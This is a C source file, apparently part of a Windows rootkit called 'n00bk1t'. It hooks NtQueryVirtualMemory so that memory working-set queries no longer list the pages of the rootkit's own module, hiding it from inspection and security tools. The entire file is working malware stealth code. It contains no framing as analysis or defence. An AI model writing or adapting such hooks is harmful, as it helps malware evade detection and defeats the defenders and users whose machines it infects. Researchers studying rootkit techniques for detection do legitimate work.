#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include "ntdll.h"

#include "engine.h"

#include "ntqueryvirtualmemory.h"

extern HMODULE n00bk1tBaseAddress;

// ntdll.NtQueryVirtualMemory
NTSTATUS WINAPI NewNtQueryVirtualMemory(
  HANDLE ProcessHandle,
  PVOID BaseAddress,
  MEMORY_INFORMATION_CLASS MemoryInformationClass,
  PVOID Buffer,
  ULONG Length,
  PULONG ResultLength
)
{
	NTSTATUS rc;
	DWORD dwCount;
	PMEMORY_WORKING_SET_LIST pMwsl;
	PMEMORY_BASIC_INFORMATION pMbi;
	PDWORD pdwPointer;
	DWORD dwNr;

	// call original function
	rc=OldNtQueryVirtualMemory(
		ProcessHandle,
		BaseAddress,
		MemoryInformationClass,
		Buffer,
		Length,
		ResultLength
		);

	if (NT_SUCCESS(rc))
	{
		if (MemoryInformationClass==MemoryWorkingSetList)
		{
			// hide ourself
			pMwsl=(PMEMORY_WORKING_SET_LIST)Buffer;
			pdwPointer=pMwsl->WorkingSetList;
			dwNr=pMwsl->NumberOfPages;
			
			for (dwCount=0;dwCount<dwNr;dwCount++)
			{
				if (*pdwPointer>>12==(DWORD)n00bk1tBaseAddress>>12)
				{
					RtlCopyMemory(pdwPointer,(char*)pdwPointer+sizeof(DWORD),sizeof(DWORD)*(dwNr-(dwCount+1)));
					RtlZeroMemory((char*)pdwPointer+sizeof(DWORD)*(dwNr-(dwCount+1)),sizeof(DWORD));
					pMwsl->NumberOfPages--;
				}
				else
					pdwPointer++;
			}
		}
		else if (MemoryInformationClass==MemoryBasicInformation)
		{
			pMbi=(PMEMORY_BASIC_INFORMATION)Buffer;
			if ((DWORD)pMbi->BaseAddress==(DWORD)n00bk1tBaseAddress)
			{
				
				// todo
			}
		}
	}

	return rc;
}